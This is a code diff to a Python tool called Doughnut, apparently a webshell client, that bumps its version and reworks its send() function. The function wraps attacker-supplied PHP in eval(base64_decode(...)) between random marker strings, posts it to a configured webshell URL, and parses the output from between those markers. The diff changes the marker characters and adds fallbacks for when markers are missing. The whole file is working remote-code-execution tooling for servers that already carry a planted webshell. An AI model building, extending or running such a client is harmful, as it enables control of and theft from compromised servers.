@@ -3,7 +3,6 @@ import subprocess
 from base64 import b64encode
 from os import popen
 from random import randint, sample
-from string import ascii_letters, digits
 from urllib3 import disable_warnings
 
 import requests
@@ -55,7 +54,7 @@ def banner():
 
 """
         )
-    print(color.green("Doughnut Version: 1.4\n"))
+    print(color.green("Doughnut Version: 1.5\n"))
 
 
 def base64_encode(data: str):
@@ -63,8 +62,10 @@ def base64_encode(data: str):
 
 
 def send(data: str, raw: bool = False, **extra_params):
-    def randstr():
-        return ''.join(sample(ascii_letters + digits, 8))
+    offset = 8
+
+    def randstr(offset):
+        return ''.join(sample("!@#$%^&*()[];,.?", offset))
     url = gget("url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell")
     php_v7 = gget("webshell.v7", "webshell")
@@ -75,8 +76,8 @@ def send(data: str, raw: bool = False, **extra_params):
     params_dict.update(extra_params)
     if "data" not in params_dict:
         params_dict["data"] = {}
-    head = randstr()
-    tail = randstr()
+    head = randstr(offset)
+    tail = randstr(offset)
     if not raw:
         data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
         if (not php_v7):
@@ -89,15 +90,23 @@ def send(data: str, raw: bool = False, **extra_params):
     # req.encoding = req.apparent_encoding
     text = req.text
     content = req.content
-    req.r_text = text[text.find(head) + 8: text.find(tail)]
-    req.r_content = content[content.find(bytes(head, 'utf-8')) + 8: content.find(bytes(tail, 'utf-8'))]
+    text_head_offset = text.find(head)
+    text_tail_offset = text.find(tail)
+    text_head_offset = text_head_offset + offset if (text_head_offset != -1) else 0
+    text_tail_offset = text_tail_offset if (text_tail_offset != -1) else len(text)
+    con_head_offset = content.find(bytes(head, 'utf-8'))
+    con_tail_offset = content.find(bytes(tail, 'utf-8'))
+    con_head_offset = con_head_offset + offset if (con_head_offset != -1) else 0
+    con_tail_offset = con_tail_offset if (con_tail_offset != -1) else len(content)
+    req.r_text = text[text_head_offset: text_tail_offset]
+    req.r_content = content[con_head_offset: con_tail_offset]
     try:
         req.r_json = json.loads(req.r_text)
     except json.JSONDecodeError:
         req.r_json = ''
     if 0:  # DEBUG
         print(f"[debug] {params_dict}")
-        print(f"[debug] [{req}] {text}")
+        print(f"[debug] [{req}] [len:{len(content)}] {text}")
     return req
 
 
